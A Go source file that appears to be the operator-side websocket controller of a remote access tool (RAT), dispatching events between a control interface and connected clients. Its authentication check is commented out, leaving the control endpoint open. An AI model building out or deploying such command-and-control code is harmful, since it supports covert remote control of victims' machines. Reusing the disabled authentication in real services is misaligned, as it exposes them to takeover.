package main

import (
	"fmt"
	"net/http"
	"rat/command/log"
	"reflect"

	"golang.org/x/net/websocket"
	"gopkg.in/mgo.v2/bson"
)

type EventListener struct {
	C          chan interface{}
	controller *Controller

	client *Client
	mh     MessageHeader
}

func (e *EventListener) Unlisten() {
	delete(e.controller.Listeners, e)
	select {
	case <-e.C:
	default:
		close(e.C)
	}
}

type Controller struct {
	ws  *websocket.Conn
	die chan struct{}

	Listeners map[*EventListener]bool
}

func NewController(ws *websocket.Conn) *Controller {
	return &Controller{
		ws:        ws,
		die:       make(chan struct{}),
		Listeners: make(map[*EventListener]bool),
	}
}

func (c *Controller) Listen(mh MessageHeader, client *Client) *EventListener {
	l := &EventListener{
		C:          make(chan interface{}),
		controller: c,
		mh:         mh,
		client:     client,
	}

	c.Listeners[l] = true
	return l
}

// Event incoming message data
type Event struct {
	// Event code
	Event int `bson:"eventId" json:"eventId"`

	// ClientID
	ClientID int `bson:"clientId" json:"clientId"`
}

var (
	WebSockets []*Controller
)

func init() {
	WebSockets = make([]*Controller, 0)
}

func sendMessage(controller *Controller, c *Client, message OutgoingMessage) error {
	id := 0

	if c != nil {
		id = c.Id
	}

	asdf := struct {
		Id   int
		Type MessageHeader
		Data interface{}
	}{
		Id:   id,
		Type: message.Header(),
		Data: message,
	}

	b, err := bson.Marshal(asdf)
	err = websocket.Message.Send(controller.ws, b)
	return err
}

func broadcast(message OutgoingMessage) {
	for _, ws := range WebSockets {
		sendMessage(ws, nil, message)
	}
}

func incomingWebSocket(ws *websocket.Conn) {
	controller := NewController(ws)
	WebSockets = append(WebSockets, controller)

	close := func() {
		ws.Close()

		for k, v := range WebSockets {
			if v == controller {
				for listener := range v.Listeners {
					listener.Unlisten()
					fmt.Println("unlistening to", listener)
				}
				close(v.die)
				WebSockets = append(WebSockets[:k], WebSockets[k+1:]...)
				break
			}
		}
	}
	defer close()

	disconnect := func(reason interface{}) {
		log.Ferror("%s: %s", ws.Request().RemoteAddr, reason)
	}
	/*
		var auth LoginMessage
		err := readMessage(ws, &auth)
		if err != nil {
			disconnect(err)
			return
		}

		authenticated := Authenticate(auth.Key)

		err = sendMessage(ws, nil, LoginResultMessage{authenticated})
		if err != nil {
			disconnect(err)
			return
		}

		if !authenticated {
			disconnect("authentication failure")
			return
		} */

	log.Fgreen("%s: connected\n", ws.Request().RemoteAddr)

	/* 	if len(DisplayTransfers) > 0 {
		sendMessage(ws, nil, DisplayTransferMessage{
			DisplayTransfers,
		})
	} */

	updateAll()

	for {
		var bbb []byte
		err := websocket.Message.Receive(ws, &bbb)
		var event Event
		bson.Unmarshal(bbb, &event)

		if err != nil {
			disconnect(err)
			return
		}

		client := get(event.ClientID)

		if handler, ok := Messages[MessageHeader(event.Event)]; ok {
			i := reflect.New(reflect.TypeOf(handler)).Interface()

			err = websocket.JSON.Receive(ws, &i)
			if err != nil {
				disconnect(err)
				return
			}

			for listener := range controller.Listeners {
				clientOk := listener.client == nil || listener.client == client
				headerOk := listener.mh == 0 || listener.mh == MessageHeader(event.Event)

				if clientOk && headerOk {
					listener.C <- i
				}
			}

			err = i.(IncomingMessage).Handle(controller, client)

			if err != nil {
				disconnect(err)
				return
			}
		} else {
			fmt.Println("missing", event.Event)
		}
	}
}

/// InitControlSocket starts listening for incoming websocket connections
func InitControlSocket() {
	http.Handle("/control", websocket.Handler(incomingWebSocket))
}
